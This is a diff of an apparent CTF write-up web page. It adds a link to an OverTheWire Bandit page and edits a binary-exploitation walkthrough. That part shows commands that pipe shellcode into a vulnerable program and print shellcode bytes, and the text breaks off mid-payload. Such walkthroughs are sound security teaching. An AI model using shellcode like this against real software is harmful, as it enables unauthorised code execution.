@@ -67,6 +67,10 @@
             <li><a href="reverse_engineering.html"> Reverse Engineering </a></li>
             <li><a href="web_exploitation.html"> Web Exploitation </a></li>
         </ul>
+        <h5> OverTheWire</h5>
+        <ul>
+            <li><a href="../OverTheWire/bandit.html"> Bandit </a></li>
+        </ul>
         <br>
       </div>
     </div>
@@ -146,7 +150,7 @@ int main(int argc, char **argv){
         <div class="row-full code">
           <pre><code class="prism language-bash">
 $ uname -a                          # look the architecture type (ex: x86_64)
-$ cat ~/shellcode.txt - | ./vuln    # write the shellcode to a file, execute it
+                                    # write the shellcode to a file, execute it
                                     # and keep the shell waiting for stdin
 
 $ python -c "print('\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe\xc8\x88\x06\x46\xe2\xf7\xff\xe7
